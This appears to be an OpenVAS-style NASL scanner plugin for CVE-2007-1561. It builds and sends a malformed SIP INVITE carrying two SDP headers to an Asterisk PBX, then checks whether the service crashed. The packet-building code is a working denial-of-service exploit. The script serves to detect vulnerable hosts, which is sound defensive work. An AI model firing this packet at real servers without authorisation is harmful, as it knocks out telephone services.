CPE = "cpe:/a:digium:asterisk";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.9999992" );
	script_version( "2020-11-12T09:56:04+0000" );
	script_tag( name: "last_modification", value: "2020-11-12 09:56:04 +0000 (Thu, 12 Nov 2020)" );
	script_tag( name: "creation_date", value: "2008-08-22 16:09:14 +0200 (Fri, 22 Aug 2008)" );
	script_tag( name: "cvss_base", value: "7.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:C" );
	script_bugtraq_id( 23031 );
	script_cve_id( "CVE-2007-1561" );
	script_name( "Asterisk PBX SDP Header Overflow Vulnerability" );
	script_category( ACT_DENIAL );
	script_family( "Denial of Service" );
	script_copyright( "Copyright (C) 2008 Ferdy Riphagen" );
	script_dependencies( "secpod_asterisk_detect.sc", "logins.sc" );
	script_mandatory_keys( "Asterisk-PBX/Installed" );
	script_xref( name: "URL", value: "http://lists.grok.org.uk/pipermail/full-disclosure/2007-March/053052.html" );
	script_xref( name: "URL", value: "http://bugs.digium.com/view.php?id=9321" );
	script_tag( name: "solution", value: "Upgrade to Asterisk release 1.4.2/1.2.17 or newer." );
	script_tag( name: "summary", value: "The remote Asterisk PBX SIP server is affected by an overflow vulnerability." );
	script_tag( name: "impact", value: "This results in a Segmentation fault in 'chan_sip.c' crashing the Asterisk PBX service." );
	script_tag( name: "insight", value: "The application installed suffers from a remote overflow in the SIP service
  resulting in a denial of service. An attacker can send a malformed INVITE packet
  with two SDP headers, whitin the first header an existing IP address in the 'c=' variable
  and in the second SDP header a NOT existing IP address in 'c='." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "exploit" );
	exit( 0 );
}
require("sip.inc.sc");
require("host_details.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!infos = get_app_location_and_proto( cpe: CPE, port: port )){
	exit( 0 );
}
proto = infos["proto"];
if(!sip_alive( port: port, proto: proto )){
	exit( 0 );
}
targethost = get_host_name();
thishost = this_host();
vtstrings = get_vt_strings();
user = vtstrings["lowercase"];
sdp_headers = NASLString( "v=0\\r\\n", "o=somehost 12345 12345 IN IP4 ", targethost, "\\r\\n", "c=IN IP4 ", targethost, "\\r\\n", "m=audio 16384 RTP/AVP 8 0 18 101\\r\\n\\r\\n", "v=1\\r\\n", "o=somehost 12345 12345 IN IP4 ", targethost, "\\r\\n", "c=IN IP4 555.x.555.x.555\\r\\n", "m=audio 16384 RTP/AVP 8 0 18 101" );
bad_invite = NASLString( "INVITE sip:", targethost, "\\r\\n", "Via: SIP/2.0/", toupper( proto ), " ", thishost, ":", port, "\\r\\n", "To: <sip:", user, "@", targethost, ":", port, ">\\r\\n", "From: <sip:", user, "@", thishost, ":", port, ">\\r\\n", "Call-ID: ", rand(), "\\r\\n", "CSeq: ", rand(), " INVITE\\r\\n", "Contact: <sip:", user, "@", thishost, ">\\r\\n", "Max-Forwards: 0\\r\\n", "Content-Type: application/sdp\\r\\n", "Content-Length: ", strlen( sdp_headers ), "\\r\\n\\r\\n", sdp_headers );
exp = sip_send_recv( port: port, data: bad_invite, proto: proto );
if(isnull( exp )){
	if(!sip_alive( port: port, proto: proto )){
		security_message( port: port, proto: proto );
		exit( 0 );
	}
}
exit( 99 );

